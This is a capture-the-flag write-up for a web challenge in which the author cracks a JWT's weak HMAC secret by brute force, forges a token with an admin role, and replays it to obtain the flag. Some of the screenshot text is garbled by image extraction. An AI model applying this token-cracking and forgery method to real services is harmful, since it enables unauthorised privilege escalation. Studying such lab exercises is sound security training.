# Super Admin
> Comfort food.

## About the Challenge
We were given a website without the source code, and we need to login as admin in order to get the flag


[Image extracted text: Login as:
User
Admin (Not for youl)
Go to Profile]



[Image extracted text: Welcome, User!
Only an admin can see the flag!]


## How to Solve?
Because there is a JWT token in the website cookie, You can use jwt.io to inspect the cookie


[Image extracted text: Encoded
PASTE A TOKEN HERE
Decoded
EDIT THE PAYLOAD AND SECRET
HEADER: ALGORITHM & TOKEN TYPE
eyJhbGciOiJIUZIINiIsInRScCI6IkpXVCJ9
ey
Jyb2xlIjoidXNlciIsImlhdCI6MTYSODYZNTMZN
"alg'
HS256 "
X0.yozk78J3cGuLtlofBxUCnUoagoROwOxXoA3O
JWT
o3hhbug
PAYLOAD: DATA
role
user
"iat
1698665335
VERIFY SIGNATURE
"typ"]


We need to change `"role": "user"` to `"role": "admin"`, but we need to know the password first. The first thing that came to my mind was bruteforcing the key. I used https://github.com/Sjord/jwtcrack to crack the password. Here is the result:

```
Cracking JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTY5ODY2NTMzNX0.yozk78J3cGuLt1ofBxUCnUoagoR9wOxXoA30o3hh6ug
27it [00:00, 12833.89it/s]
Found secret key: password1
```

Change the value from `user` to `admin` using the cracked password


[Image extracted text: HEADER: ALGORITHM & TOKEN TYPE
eyJhbGciOiJIUZIINiIsInRScCI6IkpXVCJg
ey
JybzxlIjoiyWRtal4iLCJpYXQiOjE2OTg2NjUzM
"alg"
HS256
zV9 . XYaPInlrLD8qKprBgWjEkQfWuwyBEOtkSos
"typ'
JWT
zeSwqxzk
PAYLOAD: DATA
role"
admin'
"iat
1698665335
VERIFY SIGNATURE
HMACSHA256
base64UrlEncode(header)
+
+
base64UrEncode (payload) _
lpassword1
secret
base64
encoded]


Replace the old token with the new JWT token to obtain the flag


[Image extracted text: Request
Response
Pretty
Raw
Hex
51
In
=
Pretty
Raw
Hex
Render
5
In
GET
Iprofile HTTP/1.1
HTTP/1.1
200
OK
Host
bluehens-web-cookies. chals.io
2
X-Powered-By
Express
Cookie:
creds=
Content-Type
text/html;
charset-utf-8
eyJhbGci iJIUzI NilsInRScCI6IkpXVCJ9.eyJybZxlIjoiYWRtaW4iLCJpYXQi
Content-Length:
87
OjEZOTg2NjUzMzV9. XYaPInWrLD8GKprBgWjEkQfWuwyBEOtkSoszeSwqx2k
5
W/"57-bL3+PSQvZvlIdloxxBKUTBr34FE"
6
Date
Mon ,
30
Oct
2023
11:35:04
GMT
5
Connection:
keep-alive
Keep-Alive
timeout=5
10
<hz>
Welcome,
Admin!
</hz>
<p>
Here
is
your
UDCTF{k33p_17_51mp13_S7upld_15_4_l1e}
</p>
ETag:
flag:]


```
UDCTF{k33p_17_51mp13_57up1d_15_4_l1e}
```